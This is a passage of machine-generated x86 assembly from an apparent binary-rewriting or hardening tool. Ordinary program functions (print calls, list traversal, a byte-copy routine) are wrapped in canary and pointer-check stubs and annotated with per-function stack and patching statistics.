   movl    $Var_0x804baf9, 0x4(%esp)          # [21(1945)]   #32
   movl    $0x1, (%esp)                       # [22(1946)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049d1c
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   movl    $Var_0x804bb06, 0x4(%esp)          # [24(1948)]   #32
   jmp     Label_0x8049e21 #32
Label_0x8049d2e: #p6a
   movl    $0x0, Var_0x80602b0                # [26(1950)]   #32
   movl    $Var_0x804b95d, 0x4(%esp)          # [27(1951)]   #32
   movl    $0x1, (%esp)                       # [28(1952)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049d47
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   mov     Var_0x80604b8, %eax                # [30(1954)]   #32
   cmp     Var_0x80604c4, %eax                # [31(1955)]   #32
   jle     Label_0x8049d77 #32
   movl    $Var_0x804b969, 0x4(%esp)          # [33(1957)]   #32
   movl    $0x1, (%esp)                       # [34(1958)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049d68
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   mov     Var_0x80604b8, %eax                # [36(1960)]   #32
   mov     %eax, Var_0x80604c4                # [37(1961)]   #32
Label_0x8049d77: #p6a
   movl    $Var_0x804b97e, 0x4(%esp)          # [38(1962)]   #32
   movl    $0x1, (%esp)                       # [39(1963)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049d86
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   movl    $Var_0x804b9ab, 0x4(%esp)          # [41(1965)]   #32
   movl    $0x1, (%esp)                       # [42(1966)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049d9a
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   movl    $Var_0x804b9b8, 0x4(%esp)          # [44(1968)]   #32
   movl    $0x1, (%esp)                       # [45(1969)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049dae
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   mov     Var_0x80604c4, %eax                # [47(1971)]   #32
   mov     %eax, 0x8(%esp)                    # [48(1972)]   #32
   movl    $Var_0x804b9c2, 0x4(%esp)          # [49(1973)]   #32
   jmp     Label_0x8049e79 #32
Label_0x8049dc9: #p6a
   movl    $Var_0x804b9d4, 0x4(%esp)          # [51(1975)]   #32
   movl    $0x1, (%esp)                       # [52(1976)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049dd8
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   movl    $Var_0x804ba05, 0x4(%esp)          # [54(1978)]   #32
   movl    $0x1, (%esp)                       # [55(1979)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049dec
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   movl    $Var_0x804ba10, 0x4(%esp)          # [57(1981)]   #32
   movl    $0x1, (%esp)                       # [58(1982)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049e00
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   movl    $Var_0x804ba21, 0x4(%esp)          # [60(1984)]   #32
   movl    $0x1, (%esp)                       # [61(1985)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049e14
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   movl    $Var_0x804ba2e, 0x4(%esp)          # [63(1987)]   #32
Label_0x8049e21: #p6a
   movl    $0x1, (%esp)                       # [64(1988)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049e28
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   mov     Var_0x80604b8, %eax                # [66(1990)]   #32
   mov     Var_0x80602b0, %ecx                # [67(1991)]   #32
   mov     Var_0x80604c4, %edx                # [68(1992)]   #32
   mov     %edx, 0x10(%esp)                   # [69(1993)]   #32
   mov     %ecx, 0xc(%esp)                    # [70(1994)]   #32
   mov     %eax, 0x8(%esp)                    # [71(1995)]   #32
   movl    $Var_0x804ba37, 0x4(%esp)          # [72(1996)]   #32
   movl    $0x1, (%esp)                       # [73(1997)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049e59
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   mov     Var_0x80604c0, %eax                # [75(1999)]   #32
   mov     Var_0x80604bc, %ecx                # [76(2000)]   #32
   mov     %ecx, 0xc(%esp)                    # [77(2001)]   #32
   mov     %eax, 0x8(%esp)                    # [78(2002)]   #32
   movl    $Var_0x804ba79, 0x4(%esp)          # [79(2003)]   #32
Label_0x8049e79: #p6a
   movl    $0x1, (%esp)                       # [80(2004)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049e80
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   movl    $Var_0x804bb0f, 0x4(%esp)          # [82(2006)]   #32
   movl    $0x1, (%esp)                       # [83(2007)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049e94
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   add     $0x1c, %esp                        # [85(2009)]stackSize = 0x0   #32
Label_0x8049e9c: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:31 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 32
     adding function wrapper

;     Start Index : 2011 (0x8049ea0)
;       End Index : 2033 (0x8049f1f)
;   Num Instructs : 23
;      Stack Size : 8 (0x8)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 3
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 2
;                 :  0x0(0x8), 0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x8320,7
.p2align 3,0x8325
FuncPtr_0x8049ea0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049ea0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049ea0:

Label_0x8049ea0:
   push    %esi                               # [0(2011)]stackSize = 0x4   #32
   sub     $0x8, %esp                         # [1(2012)]stackSize = 0xc   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049ea4
   .long    Func_0x80484f0  #pp1w: Label_0x80484f0 VAR_ADDRESS #32
   mov     Var_0x80604c4, %ecx                # [3(2014)]   #32
   mov     Var_0x80604b8, %eax                # [4(2015)]   #32
   cmp     %eax, %ecx                         # [5(2016)]   #32
   mov     $0x19, %esi                        # [6(2017)]# FLAGS USED   #32
   jge     Label_0x8049ed0 #32
   mov     %eax, Var_0x80604c4                # [8(2019)]   #32
Label_0x8049ed0: #p6a
   call    Func_0x8049f20  #pp1: Label_0x8049f20 VAR_ADDRESS #32
   sub     $0x1, %esi                         # [10(2021)]# FLAGS USED   #32
   jne     Label_0x8049ed0 #32
   movb    $0x0, Var_0x80602b4                # [12(2023)]   #32
   movl    $0x0, Var_0x80604b8                # [13(2024)]   #32
   movl    $0x2710, Var_0x80602b0             # [14(2025)]   #32
   movl    $0x7d, Var_0x80604c0               # [15(2026)]   #32
   movl    $0x5, Var_0x80604bc                # [16(2027)]   #32
   movl    $Var_0x804bb1c, 0x4(%esp)          # [17(2028)]   #32
   movl    $0x1, (%esp)                       # [18(2029)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049f16
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   add     $0x8, %esp                         # [20(2031)]stackSize = 0x4   #32
   pop     %esi                               # [21(2032)]stackSize = 0x0   #32
Label_0x8049f1f: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:32 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 75   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2824 (0x804aa00)
;       End Index : 2850 (0x804aa4d)
;   Num Instructs : 27
;      Stack Size : 0 (0x0)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 3
;      ESP Params : 
;                 :  0xc(0x4), 0x10(0x4), 0x14(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5520,7
.p2align 3,0x5525
FuncPtr_0x804aa00:

Func_0x804aa00:

Label_0x804aa00:
   push    %ebx                               # [0(2824)]stackSize = 0x4   #32
   push    %esi                               # [1(2825)]stackSize = 0x8   #32
   mov     0x14(%esp), %ecx                   # [2(2826)]   #32
   mov     0x10(%esp), %edx                   # [3(2827)]   #32
   mov     0xc(%esp), %eax                    # [4(2828)]   #32
   cmp     %edx, %eax                         # [5(2829)]   #32
   jae     Label_0x804aa2b #32
   test    %ecx, %ecx                         # [7(2831)]   #32
   je      Label_0x804aa4b #32
   mov     %eax, %esi                         # [9(2833)]   #32
Label_0x804aa20: #p6a
   mov     (%edx), %bl                        # [10(2834)]Using Pointer PTRCHECK arg[0]    #32
   mov     %bl, (%esi)                        # [11(2835)]Using Pointer PTRCHECK arg[1]    #32
   add     $0x1, %edx                         # [12(2836)]   #32
   add     $0x1, %esi                         # [13(2837)]   #32
   sub     $0x1, %ecx                         # [14(2838)]# FLAGS USED   #32
   jne     Label_0x804aa20 #32
   jmp     Label_0x804aa4b #32
Label_0x804aa2b: #p6a
   jbe     Label_0x804aa4b #32
   test    %ecx, %ecx                         # [18(2842)]   #32
   je      Label_0x804aa4b #32
Label_0x804aa40: #p6a
   mov     -0x1(%edx, %ecx ,  0x1), %bl       # [20(2844)] Using pointer with negative offset PTRCHECK arg[0]    # <<<=== Need to Address an Array
   mov     %bl, -0x1(%eax, %ecx ,  0x1)       # [21(2845)] Using pointer with negative offset PTRCHECK arg[1]    # <<<=== Need to Address an Array
   sub     $0x1, %ecx                         # [22(2846)]# FLAGS USED   #32
   jne     Label_0x804aa40 #32
Label_0x804aa4b: #p6a
   pop     %esi                               # [24(2848)]stackSize = 0x4   #32
   pop     %ebx                               # [25(2849)]stackSize = 0x0   #32
Label_0x804aa4d: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:75 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 7
     adding function wrapper

;     Start Index : 297 (0x80484f0)
;       End Index : 330 (0x8048556)
;   Num Instructs : 34
;      Stack Size : 20 (0x14)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 3
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 2
;                 :  0x0(0x14), 0x8(0xc); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5720,7
.p2align 3,0x5725
FuncPtr_0x80484f0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x80484f0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x80484f0:

Label_0x80484f0:
   push    %edi                               # [0(297)]stackSize = 0x4   #32
   push    %esi                               # [1(298)]stackSize = 0x8   #32
   sub     $0x14, %esp                        # [2(299)]stackSize = 0x1c   #32
   mov     Var_0x80602a8, %ecx                # [3(300)]   #32
   test    %ecx, %ecx                         # [4(301)]   #32
   je      Label_0x8048551 #32
   xor     %edx, %edx                         # [6(303)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048501
   .long    Func_0x8048560  #pp1w: Label_0x8048560 VAR_ADDRESS #32
   mov     %eax, %esi                         # [8(305)]   #32
   test    %esi, %esi                         # [9(306)]   #32
   je      Label_0x8048551 #32
   mov     %esi, %edi                         # [11(308)]   #32
   xchg    %ax, %ax                           # [12(309)]   #32
Label_0x8048510: #p6a
   mov     Var_0x80602a8, %ecx                # [13(310)]   #32
   movsd   (%edi), %xmm0                      # [14(311)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%edi), %xmm1                   # [15(312)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [16(313)]   #32
   movsd   %xmm0, (%esp)                      # [17(314)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804852a
   .long    Func_0x8048310  #pp1w: Label_0x8048310 VAR_ADDRESS #32
   mov     0x14(%edi), %edi                   # [19(316)]Using Pointer PTRCHECK arg[0]    #32
   test    %edi, %edi                         # [20(317)]   #32
   jne     Label_0x8048510 #32
   test    %esi, %esi                         # [22(319)]   #32
   je      Label_0x8048551 #32
Label_0x8048540: #p6a
   mov     0x14(%esi), %edi                   # [24(321)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, (%esp)                       # [25(322)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048546
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   test    %edi, %edi                         # [27(324)]   #32
   mov     %edi, %esi                         # [28(325)]# FLAGS USED   #32
   jne     Label_0x8048540 #32
Label_0x8048551: #p6a
   add     $0x14, %esp                        # [30(327)]stackSize = 0x8   #32
   pop     %esi                               # [31(328)]stackSize = 0x4   #32
   pop     %edi                               # [32(329)]stackSize = 0x0   #32
Label_0x8048556: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:7 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 4
     adding function wrapper

;     Start Index : 174 (0x8048310)
;       End Index : 252 (0x80483f5)
;   Num Instructs : 79
;      Stack Size : 28 (0x1c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 4
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 4
;                 :  0x0(0x1c), 0x8(0x14),
;      ESP Params : 
;                 :  0x30(0x4), 0x34(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 5
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x4620,7
.p2align 3,0x4625
FuncPtr_0x8048310:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048310,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048310:

Label_0x8048310:
   push    %ebp                               # [0(174)]stackSize = 0x4   #32
   push    %ebx                               # [1(175)]stackSize = 0x8   #32
   push    %edi                               # [2(176)]stackSize = 0xc   #32
   push    %esi                               # [3(177)]stackSize = 0x10   #32
   sub     $0x1c, %esp                        # [4(178)]stackSize = 0x2c   #32
   mov     %ecx, %esi                         # [5(179)]   #32
   mov     0x34(%esp), %ebx                   # [6(180)]   #32
   mov     0x38(%esp), %ebp                   # [7(181)]   #32
   movsd   0x10(%esi), %xmm0                  # [8(182)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x18(%esi), %xmm1                  # [9(183)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [10(184)]   #32
   movsd   %xmm0, (%esp)                      # [11(185)]   #32
   mov     %ebx, %ecx                         # [12(186)]   #32
   mov     %ebp, %edx                         # [13(187)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804833a
   .long    Func_0x80492e0  #pp1w: Label_0x80492e0 VAR_ADDRESS #32
   test    %eax, %eax                         # [15(189)]   #32
   mov     $-0x1, %edi                        # [16(190)]# FLAGS USED   #32
   je      Label_0x80483ec #32
   mov     %ebp, (%esp)                       # [18(192)]   #32
   mov     %esi, %ecx                         # [19(193)]   #32
   mov     %ebx, %edx                         # [20(194)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048353
   .long    Func_0x8049310  #pp1w: Label_0x8049310 VAR_ADDRESS #32
   lea     0x34(%esp), %ecx                   # [22(196)] Loading Pointer with stackSize: 44   #32
   test    %eax, %eax                         # [23(197)]   #32
   je      Label_0x804838d #32
   movsd   (%ecx), %xmm0                      # [25(199)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%ecx), %xmm1                   # [26(200)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [27(201)]   #32
   movsd   %xmm0, (%esp)                      # [28(202)]   #32
   mov     %eax, %ecx                         # [29(203)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048376
   .long    Func_0x8048310  #pp1w: Label_0x8048310 VAR_ADDRESS #32
   test    %eax, %eax                         # [31(205)]   #32
   jne     Label_0x80483ec #32
   mov     %esi, %ecx                         # [33(207)]   #32
   add     $0x1c, %esp                        # [34(208)]stackSize = 0x10   #32
   pop     %esi                               # [35(209)]stackSize = 0xc   #32
   pop     %edi                               # [36(210)]stackSize = 0x8   #32
   pop     %ebx                               # [37(211)]stackSize = 0x4   #32
   pop     %ebp                               # [38(212)]stackSize = 0x0   #32
   jmp     Func_0x80494e0 #32
Label_0x804838d: #p6a
   mov     0xc(%esi), %eax                    # [40(214)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [41(215)]   #32
   je      Label_0x80483ec #32
   mov     %ecx, %edx                         # [43(217)]   #32
   mov     (%edx), %ecx                       # [44(218)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x4(%edx), %edx                    # [45(219)]Using Pointer PTRCHECK arg[0]    #32
Label_0x80483a0: #p6a
   cmp     (%eax), %ecx                       # [46(220)]Using Pointer PTRCHECK arg[0]    #32
   jne     Label_0x80483a9 #32
   cmp     0x4(%eax), %edx                    # [48(222)]Using Pointer PTRCHECK arg[0]    #32
   je      Label_0x80483b2 #32
Label_0x80483a9: #p6a
   mov     0x14(%eax), %eax                   # [50(224)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [51(225)]   #32
   jne     Label_0x80483a0 #32
   jmp     Label_0x80483ec #32
Label_0x80483b2: #p6a
   mov     0x14(%eax), %ecx                   # [54(228)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [55(229)]   #32
   je      Label_0x80483bf #32
   mov     0x10(%eax), %edx                   # [57(231)]Using Pointer PTRCHECK arg[0]    #32
   mov     %edx, 0x10(%ecx)                   # [58(232)]Using Pointer PTRCHECK arg[1]    #32
Label_0x80483bf: #p6a
   mov     0x10(%eax), %edx                   # [59(233)]Using Pointer PTRCHECK arg[0]  Already checked [57]   #32
   mov     0x14(%eax), %ecx                   # [60(234)]Using Pointer PTRCHECK arg[0]  Already checked [54]   #32
   test    %edx, %edx                         # [61(235)]   #32
   je      Label_0x80483ce #32
   mov     %ecx, 0x14(%edx)                   # [63(237)]Using Pointer PTRCHECK arg[1]    #32
   jmp     Label_0x80483d1 #32
Label_0x80483ce: #p6a
   mov     %ecx, 0xc(%esi)                    # [65(239)]Using Pointer PTRCHECK arg[1]  Already checked [40]   #32
Label_0x80483d1: #p6a
   movl    $0x0, 0x10(%eax)                   # [66(240)]Using Pointer PTRCHECK arg[1]  Already checked [59]   #32
   movl    $0x0, 0x14(%eax)                   # [67(241)]Using Pointer PTRCHECK arg[1]  Already checked [60]   #32
   mov     %eax, (%esp)                       # [68(242)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80483e2
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   subl    $0x1, 0x8(%esi)                    # [70(244)]Using Pointer PTRCHECK arg[0]    #32
   xor     %edi, %edi                         # [71(245)]   #32
Label_0x80483ec: #p6a
   mov     %edi, %eax                         # [72(246)]   #32
   add     $0x1c, %esp                        # [73(247)]stackSize = 0x10   #32
   pop     %esi                               # [74(248)]stackSize = 0xc   #32
   pop     %edi                               # [75(249)]stackSize = 0x8   #32
   pop     %ebx                               # [76(250)]stackSize = 0x4   #32
   pop     %ebp                               # [77(251)]stackSize = 0x0   #32
Label_0x80483f5: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:4 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 16
     adding function wrapper

;     Start Index : 1286 (0x8049310)
;       End Index : 1345 (0x80493c8)
;   Num Instructs : 60
;      Stack Size : 28 (0x1c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 4
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 3
;                 :  0x0(0x1c), 0x8(0x14),
;      ESP Params : 
;                 :  0x30(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x3520,7
.p2align 3,0x3525
FuncPtr_0x8049310:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049310,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049310:

Label_0x8049310:
   push    %ebp                               # [0(1286)]stackSize = 0x4   #32
   push    %ebx                               # [1(1287)]stackSize = 0x8   #32
   push    %edi                               # [2(1288)]stackSize = 0xc   #32
   push    %esi                               # [3(1289)]stackSize = 0x10   #32
   sub     $0x1c, %esp                        # [4(1290)]stackSize = 0x2c   #32
   mov     %edx, %esi                         # [5(1291)]   #32
   mov     %ecx, %ebx                         # [6(1292)]   #32
   xor     %ebp, %ebp                         # [7(1293)]   #32
   cmpl    $0x0, 0x20(%ebx)                   # [8(1294)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x8049396 #32
   mov     0x34(%esp), %edi                   # [10(1296)]   #32
   mov     0x38(%ebx), %ebp                   # [11(1297)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x10(%ebp), %xmm0                  # [12(1298)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x18(%ebp), %xmm1                  # [13(1299)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [14(1300)]   #32
   movsd   %xmm0, (%esp)                      # [15(1301)]   #32
   mov     %esi, %ecx                         # [16(1302)]   #32
   mov     %edi, %edx                         # [17(1303)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049343
   .long    Func_0x80492e0  #pp1w: Label_0x80492e0 VAR_ADDRESS #32
   test    %eax, %eax                         # [19(1305)]   #32
   jne     Label_0x8049396 #32
   mov     0x3c(%ebx), %ebp                   # [21(1307)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x10(%ebp), %xmm0                  # [22(1308)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x18(%ebp), %xmm1                  # [23(1309)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [24(1310)]   #32
   movsd   %xmm0, (%esp)                      # [25(1311)]   #32
   mov     %esi, %ecx                         # [26(1312)]   #32
   mov     %edi, %edx                         # [27(1313)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049368
   .long    Func_0x80492e0  #pp1w: Label_0x80492e0 VAR_ADDRESS #32
   test    %eax, %eax                         # [29(1315)]   #32
   jne     Label_0x8049396 #32
   mov     0x40(%ebx), %ebp                   # [31(1317)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x10(%ebp), %xmm0                  # [32(1318)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x18(%ebp), %xmm1                  # [33(1319)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [34(1320)]   #32
   movsd   %xmm0, (%esp)                      # [35(1321)]   #32
   mov     %esi, %ecx                         # [36(1322)]   #32
   mov     %edi, %edx                         # [37(1323)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804938d
   .long    Func_0x80492e0  #pp1w: Label_0x80492e0 VAR_ADDRESS #32
   test    %eax, %eax                         # [39(1325)]   #32
   je      Label_0x80493a0 #32
Label_0x8049396: #p6a
   mov     %ebp, %eax                         # [41(1327)]   #32
Label_0x8049398: #p6a
   add     $0x1c, %esp                        # [42(1328)]stackSize = 0x10   #32
   pop     %esi                               # [43(1329)]stackSize = 0xc   #32
   pop     %edi                               # [44(1330)]stackSize = 0x8   #32
   pop     %ebx                               # [45(1331)]stackSize = 0x4   #32
   pop     %ebp                               # [46(1332)]stackSize = 0x0   #32
Label_0x804939f: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x80493a0: #p6a
   mov     0x44(%ebx), %ebx                   # [48(1334)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x10(%ebx), %xmm0                  # [49(1335)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x18(%ebx), %xmm1                  # [50(1336)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [51(1337)]   #32
   movsd   %xmm0, (%esp)                      # [52(1338)]   #32
   mov     %esi, %ecx                         # [53(1339)]   #32
   mov     %edi, %edx                         # [54(1340)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80493bc
   .long    Func_0x80492e0  #pp1w: Label_0x80492e0 VAR_ADDRESS #32
   test    %eax, %eax                         # [56(1342)]   #32
   cmove   %eax, %ebx                         # [57(1343)]   #32
   mov     %ebx, %eax                         # [58(1344)]   #32
   jmp     Label_0x8049398 #32

/*;;;;;;;; 
; id:16 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 15
     adding function wrapper

;     Start Index : 1266 (0x80492e0)
;       End Index : 1285 (0x804930f)
;   Num Instructs : 20
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x4920,7
.p2align 3,0x4925
FuncPtr_0x80492e0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x80492e0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x80492e0:

Label_0x80492e0:
   cmp     %ecx, 0x8(%esp)                    # [0(1266)]   #32
   jle     Label_0x80492ec #32
   xor     %eax, %eax                         # [2(1268)]   #32
   movzbl  %al, %eax                          # [3(1269)]   #32
Label_0x80492eb: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x80492ec: #p6a
   lea     0x8(%esp), %eax                    # [5(1271)] Loading Pointer with stackSize: 0   #32
   cmp     %ecx, 0x8(%eax)                    # [6(1272)]Using Pointer PTRCHECK arg[1]    #32
   jle     Label_0x8049300 #32
   cmp     %edx, 0x4(%eax)                    # [8(1274)]Using Pointer PTRCHECK arg[1]    #32
   jle     Label_0x8049306 #32
   xor     %eax, %eax                         # [10(1276)]   #32
   movzbl  %al, %eax                          # [11(1277)]   #32
Label_0x80492ff: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x8049300: #p6a
   xor     %eax, %eax                         # [13(1279)]   #32
   movzbl  %al, %eax                          # [14(1280)]   #32
Label_0x8049305: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x8049306: #p6a
   cmp     %edx, 0xc(%eax)                    # [16(1282)]Using Pointer PTRCHECK arg[1]    #32
   setg    %al                                # [17(1283)]   #32
   movzbl  %al, %eax                          # [18(1284)]   #32
Label_0x804930f: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:15 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 8
     adding function wrapper

;     Start Index : 331 (0x8048560)
;       End Index : 448 (0x80486e0)
;   Num Instructs : 118
;      Stack Size : 12 (0xc)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 5
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 2
;                 :  0x0(0xc), 0x4(0x8); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 6
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5520,7
.p2align 3,0x5525
FuncPtr_0x8048560:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048560,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048560:

Label_0x8048560:
   push    %ebp                               # [0(331)]stackSize = 0x4   #32
